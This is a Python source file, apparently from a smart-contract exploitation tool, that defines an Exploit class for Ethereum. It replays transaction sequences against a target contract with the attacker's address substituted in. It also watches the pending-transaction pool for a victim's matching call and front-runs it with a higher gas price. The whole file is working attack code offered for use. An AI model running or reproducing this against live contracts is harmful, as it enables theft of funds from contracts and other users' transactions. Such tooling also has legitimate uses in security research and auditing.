from web3 import Web3
import time


class Exploit:
    def __init__(self, txs: list, w3: Web3, contract: str, account: str, account_pk: str):
        self.txs = txs
        self.w3 = w3
        self.contract = contract
        self.account = account

        self.contract = Web3.toChecksumAddress(contract)
        self.account = Web3.toChecksumAddress(account)
        self.account_private_key = account_pk

        self.gas_price = 10 ** 10  # 10 gwei
        self.gas = 200000

    def __repr__(self):
        return "Exploit: (txs={})".format(self.txs)

    def execute(self, estimate_gas=True):
        receipts = []

        for tx in self.txs:
            run_tx = {
                "from": self.account,
                "to": self.contract,
                "gasPrice": self.gas_price,
                "gas": self.gas,
                "value": tx.tx_data["value"],
                "data": tx.tx_data["input"].replace("deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", self.account[2:]),
            }

            if estimate_gas is True:
                run_tx["gas"] = self.w3.eth.estimateGas(run_tx)

            receipts.append(self.send_tx(run_tx))

        return receipts

    def frontrun(self, flush=False):
        print("Waiting for a victim to reach into the honey jar.")

        # Wait for each tx and frontrun it.
        for tx in self.txs:
            victim_tx = self.wait_for(self.contract, tx, flush=flush)

            frontrun_tx = {
                "from": self.account,
                "to": self.contract,
                "gasPrice": hex(victim_tx["gasPrice"] + 1),
                "data": victim_tx["input"].replace("deadbeefdeadbeefdeadbeefdeadbeefdeadbeef", self.account[2:]),
                "gas": victim_tx["gas"],
                "value": victim_tx["value"],
            }

            receipt = self.send_tx(frontrun_tx)
            print(
                "Mined transaction: {tx}".format(tx=(receipt["transactionHash"].hex()))
            )

    def send_tx(self, tx: dict, wait=True) -> str:
        # Make sure the addresses are checksummed.
        tx["from"] = Web3.toChecksumAddress(tx["from"])
        tx["to"] = Web3.toChecksumAddress(tx["to"])
        tx["nonce"] = self.w3.eth.getTransactionCount(self.account)

        signed_tx = self.w3.eth.account.signTransaction(tx, self.account_private_key)
        print("Sending tx: {tx}".format(tx=tx))
        tx_hash = self.w3.eth.sendRawTransaction(signed_tx.rawTransaction)
        if wait is True:
            print("Waiting for {tx_hash} to be mined...".format(tx_hash=tx_hash))
            tx_receipt = self.w3.eth.waitForTransactionReceipt(tx_hash, timeout=300)
            print("Receipt: {}".format(tx_receipt))

        return tx_receipt

    def wait_for(self, contract, tx, flush=False):
        # Setting up filter
        pending_filter = self.w3.eth.filter("pending")

        # Ignore existing transactions and wait for new ones
        if flush is True:
            print(
                "Flushing {} existing transactions.".format(
                    len(pending_filter.get_new_entries())
                )
            )

        while True:
            time.sleep(1)
            pending_txs_hashes = pending_filter.get_new_entries()
            print("Processing {} transactions.".format(len(pending_txs_hashes)))
            for hash in pending_txs_hashes:
                pending_tx = self.w3.eth.getTransaction(hash)

                # Skip some uninteresting transactions
                if (pending_tx is None) or (pending_tx.get("to") is None):
                    continue

                # Skip transactions already mined
                if pending_tx.get("blockNumber") is not None:
                    continue

                if (pending_tx.get("to", str("")).lower() == contract.lower()) and (
                    pending_tx.get("input", "").lower()
                    == tx.tx_data.get("input", "").lower()
                ):
                    print(
                        "Found pending tx: {tx} from: {sender}.".format(
                            tx=pending_tx.get("hash", b"0").hex(),
                            sender=pending_tx.get("from"),
                        )
                    )
                    return pending_tx
